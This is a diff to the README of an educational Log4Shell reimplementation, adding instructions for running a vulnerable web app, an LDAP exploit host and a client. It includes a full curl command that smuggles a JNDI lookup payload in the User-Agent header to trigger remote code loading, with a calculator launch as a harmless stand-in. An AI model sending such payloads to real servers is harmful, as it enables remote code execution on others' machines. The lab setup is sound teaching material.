@@ -55,31 +55,38 @@ The project reimplements the Log4Shell vulnerability, explores its exploitation 
 
 ## Instructions on Testing
 
+To test the exploit, you need to start three programs:
+- the vulnerable application,
+- the exploit host,
+- the client makes the vulnerable application initiate the concact with the exploit host.
+
+The following three sub-section describe how to do that. Then follows a sub-section describing how to know if the exploit worked.
+
 ### Vulnerable App
 
-Located in `vulnerable-app/`. Install Apache maven (tested on version 3.9.6),
-navigate to the app's directory and run the command `mvn compile exec:java -q
--Dexec.mainClass="App"`.
+Located in `vulnerable-app/`. Either install docker & docker compose and run `docker compose up`, or install Apache maven (tested on version 3.9.6) and an older version of JDK (tested on Oracle's JDK version 1.8.0_181) which should be pointed to by the `JAVA_HOME` environment variable, navigate to the app's directory and run the command `mvn package -q && java -cp ./target/target-app-1.0-SNAPSHOT.jar App`.
 
-It is a web server that listen on port 8080 and logs the current time, the
-connecting clients' IP address and user agent and the requests method and path,
-all of which are pretty common for web servers to log.
+It is a web server that listen on port 8080 and logs the current time, the connecting clients' IP address and user agent and the requests method and path, all of which are pretty common for web servers to log.
 
-By default it only listens for connections coming from the host itself. To
-listen for connections coming from other hosts (which is pretty dangerous),
-append `-Dexec.args="listen-any"` to the command mentioned above.
+By default it only listens for connections coming from the host itself. To listen for connections coming from other hosts (WHICH IS DANGEROUS as it allows ANYONE to EXECUTE arbitrary CODE on your machine without any more interaction from you), append `listen-any` to the end of the command mentioned above.
 
 ### Exploit Host
 
-Located in `exploit-host/`. Either install docker & docker compose and run
-`docker compose up`, or install Apache maven (tested on version 3.9.6), navigate to
-the app's directory and run the command `mvn package -q && java -cp
-target/exploit-host-1.0-SNAPSHOT.jar App`.
+Located in `exploit-host/`. Either install docker & docker compose and run `docker compose up`, or install Apache maven (tested on version 3.9.6) and a version of JDK producing class files that the target's JDK understands (such as Oracle's JDK version 1.8.0_181), navigate to the app's directory and run the command `mvn package -q && java -cp target/exploit-host-1.0-SNAPSHOT.jar App`.
 
-It by default listens on port 1389 and 3000, but can be changed with
-`$LDAP_PORT` and `$HTTP_PORT` respectively. If the client cannot reach the
-exploit host through `localhost`, `$HOST` must also be set to the ip or
-hostname on which it can.
+It by default listens on port 1389 and 3000, but can be changed with `$LDAP_PORT` and `$HTTP_PORT` respectively. If the client cannot reach the exploit host through `localhost`, `$HOST` must also be set to the ip or hostname on which it can.
+
+### Client application
+
+The client can be anything that triggers the vulnerable app to log some string. In this case, the vulnerable application logs the connecting client's user agent, so simply running the command
+```sh
+curl http://ip_to_vulnerable_app:8080 -H 'User-Agent: ${jndi:ldap://ip_to_exploit_host_reachable_from_vulnerable_app:1389/a}'
+```
+should suffice.
+
+### Checking that the exploit worked
+
+If the computer running the vulnerable app has either a program called `calc.exe` or `gnome-calculator`, a calculator should have started on it. This is a stand-in for an actually malicious program to show that remote code execution has been reached. In case none of those exist on the computer, such as if the vulnerable app is running in a docker container, it also creates a file called `if_this_exists_you_got_owned` in the directory that the vulnerable app was started in, so make sure to also check for that. If the vulnerable app is running with `docker compose up`, you can open a new terminal in the same directory and type `docker compose exec -it vulnerable-app ls` and you should see the mentioned file.
 
 ## Contributions
 ### Max Andersson
